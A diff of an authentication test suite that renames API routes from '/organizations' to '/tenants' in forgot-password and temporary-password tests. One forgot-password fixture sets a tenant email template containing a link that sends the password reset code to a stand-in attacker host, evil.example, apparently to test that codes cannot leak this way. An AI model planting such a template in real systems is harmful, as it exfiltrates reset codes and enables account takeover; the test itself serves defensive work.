@@ -252,15 +252,15 @@ describe("auth / forgot password", suite, () => {
     const admin = await signUp("resetadmin");
     const member = await signUp("resetmember");
     const outsider = await signUp("resetoutsider");
-    const org = await createJson(admin.accessToken, "/organizations", { name: label("Reset tenant") });
+    const org = await createJson(admin.accessToken, "/tenants", { name: label("Reset tenant") });
     const slug = `reset-${Date.now().toString(36)}`;
-    const launched = await callApi(`/organizations/${org.id}`, { method: "PATCH", token: admin.accessToken, body: { slug } });
+    const launched = await callApi(`/tenants/${org.id}`, { method: "PATCH", token: admin.accessToken, body: { slug } });
     assert.equal(launched.status, 200, launched.text);
     await joinOrg(admin.accessToken, org.id, member);
 
-    const templates = await callApi(`/organizations/${org.id}/email-templates`, { token: admin.accessToken });
+    const templates = await callApi(`/tenants/${org.id}/email-templates`, { token: admin.accessToken });
     const reset = templates.json.items.find((item) => item.for === "PasswordReset");
-    const patched = await callApi(`/organizations/${org.id}/email-templates/${reset.id}`, {
+    const patched = await callApi(`/tenants/${org.id}/email-templates/${reset.id}`, {
       method: "PATCH",
       token: admin.accessToken,
       body: { template: '<p>Tenant copy</p><p>{{reset.code}}</p><p><a href="https://evil.example/?c={{reset.code}}">Reset</a></p>' },
@@ -282,9 +282,9 @@ describe("auth / forgot password", suite, () => {
 describe("auth / temporary password", suite, () => {
   test("requires a new password before other requests", async () => {
     const admin = await signUp("tmpadmin");
-    const org = await createJson(admin.accessToken, "/organizations", { name: label("Temp password org") });
+    const org = await createJson(admin.accessToken, "/tenants", { name: label("Temp password org") });
     const person = identity("tmpuser");
-    await createJson(admin.accessToken, `/organizations/${org.id}/memberships`, {
+    await createJson(admin.accessToken, `/tenants/${org.id}/memberships`, {
       email: person.email,
       username: person.username,
       password: person.password,
@@ -295,7 +295,7 @@ describe("auth / temporary password", suite, () => {
 
     const session = await logIn(person.username, person.password, { mustChangePassword: true });
 
-    const blocked = await callApi("/organizations", { token: session.accessToken });
+    const blocked = await callApi("/tenants", { token: session.accessToken });
     assertError(blocked, 403, "password_change_required", "You must change your password before continuing.");
 
     const me = await callApi("/users/me", { token: session.accessToken });
@@ -334,7 +334,7 @@ describe("auth / temporary password", suite, () => {
 
     const after = await logIn(person.username, "new-password-1");
     assert.equal(after.user.mustChangePassword, false);
-    const orgs = await callApi("/organizations", { token: after.accessToken });
+    const orgs = await callApi("/tenants", { token: after.accessToken });
     assert.equal(orgs.status, 200);
   });
 });
